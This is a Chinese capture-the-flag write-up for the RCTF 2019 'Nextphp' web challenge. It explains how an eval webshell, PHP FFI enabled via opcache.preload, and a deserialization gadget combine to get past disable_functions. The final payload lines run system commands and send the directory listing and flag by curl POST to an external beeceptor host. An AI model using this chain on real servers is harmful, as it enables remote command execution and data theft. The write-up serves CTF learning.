# \[RCTF 2019]Nextphp

## \[RCTF 2019]Nextphp

## 考点

* PHP FFI
* PHP opcache
* bypass disable\_functions

## wp

给了个shell的源码

```php
<?php
if (isset($_GET['a'])) {
    eval($_GET['a']);
} else {
    show_source(__FILE__);
}
```

`?a=phpinfo();`看到phpinfo中设置了disable\_functions

![](<../../.gitbook/assets/image (8) (1).png>)

`?a=var_dump(scandir('/'));`提示没有权限，`?a=var_dump(scandir('.'));`看到两个文件，index.php和preload.php。再读取preload.php

```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'print_r',
        'arg' => '1'
    ];

    private function run () {
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }

    public function __serialize(): array {
        return $this->data;
    }

    public function __unserialize(array $data) {
        array_merge($this->data, $data);
        $this->run();
    }

    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }

    public function __get ($key) {
        return $this->data[$key];
    }

    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

    public function __construct () {
        throw new \Exception('No implemented');
    }
}
```

实际上还是要仔细观察phpinfo，可以看到设置了opcache.preload，启用了FFI，禁用了反射类

```
opcache.preload：/var/www/html/preload.php
open_basedir：/var/www/html
disable_classes：ReflectionClass
disable_functions:
```

![](<../../.gitbook/assets/image (16).png>)

![](<../../.gitbook/assets/image (5) (1) (1).png>)

[opcache.preload](https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload) 是 **PHP7.4** 中新加入的功能。如果设置了 [opcache.preload](https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload) ，那么在所有Web应用程序运行之前，服务会先将设定的 **preload** 文件加载进内存中，使这些 **preload** 文件中的内容对之后的请求均可用。更多细节可以阅读：[https://wiki.php.net/rfc/preload](https://wiki.php.net/rfc/preload) ，在这篇文档尾巴可以看到如下描述：

> In conjunction with ext/FFI (dangerous extension), we may allow FFI functionality only in preloaded PHP files, but not in regular ones

大概意思就是说允许在 **preload** 文件中使用 **FFI** 拓展，但是文档中说了 **FFI** 是一个危险的拓展，而这道题目却开启了 **FFI** 拓展。我们可以参考文档：[https://wiki.php.net/rfc/ffi](https://wiki.php.net/rfc/ffi) 中的例子：

```php
<?php
// create FFI object, loading libc and exporting function printf()
$ffi = FFI::cdef(
    "int printf(const char *format, ...);", // this is regular C declaration
    "libc.so.6");
// call C printf()
$ffi->printf("Hello %s!\n", "world");
```

如果不设置 **FFI::cdef** 的第二个参数，也可以调用 **C** 函数。那么命令执行函数格式如下

```php
<?php
$ffi = FFI::cdef("int system(const char * command);");
$ffi->system("whoami");
```

preload.php中定义了A类，实现了Serializable接口，`__unserialize()`函数会在反序列化时被调用。这一特性是在PHP7.4中新加入的，具体可参考：[https://wiki.php.net/rfc/custom\_object\_serialization](https://wiki.php.net/rfc/custom\_object\_serialization)

```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => 'int system(char *command);'
    ];
    public function serialize (): string {
        return serialize($this->data);
    }
    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }
    public function __get ($key) {
        return $this->data[$key];
    }
    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

}
echo base64_encode(serialize(new A()));
// QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319I7fX0
```

传入`?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319")));`

![](<../../.gitbook/assets/image (34) (1).png>)

触发`A::run()`从而把FFI对象返回给`A->data['ret']`，再用`A::__get()`函数就可以获取FFI对象了

`?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319"))->__get('ret'));`

![](<../../.gitbook/assets/image (2) (1).png>)

最后payload

```
?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319"))->__get('ret')->system("echo `ls /` > 1.txt;curl -v -X POST 'https://peri0d.free.beeceptor.com/my/api/' -d @1.txt"));
?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319"))->__get('ret')->system("echo `cat /flag` > 1.txt;curl -v -X POST 'https://peri0d.free.beeceptor.com/my/api/' -d @1.txt"));
```

![](<../../.gitbook/assets/image (35) (1).png>)

## 小结

1. [RCTF2019Web题解之nextphp](https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp)
